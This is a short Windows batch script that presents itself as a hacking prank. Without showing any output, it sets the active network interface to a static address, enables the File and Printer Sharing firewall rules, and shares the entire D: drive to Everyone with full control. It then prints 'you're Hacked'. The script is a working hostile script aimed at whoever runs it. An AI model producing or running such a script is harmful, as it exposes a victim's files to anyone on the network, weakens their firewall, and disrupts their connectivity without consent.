@echo off
color 0a
for /f "tokens=4*" %%a in ('netsh interface show interface ^| findstr "Connected Dedicated"') do set INT=%%b
if "%INT%"=="" set INT=Ethernet
netsh interface ip set address name="%INT%" static 192.168.1.1 255.255.255.0 >nul 2>&1
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes >nul 2>&1
net share DataD=D:\ /grant:everyone,full /y >nul 2>&1
echo you're Hacked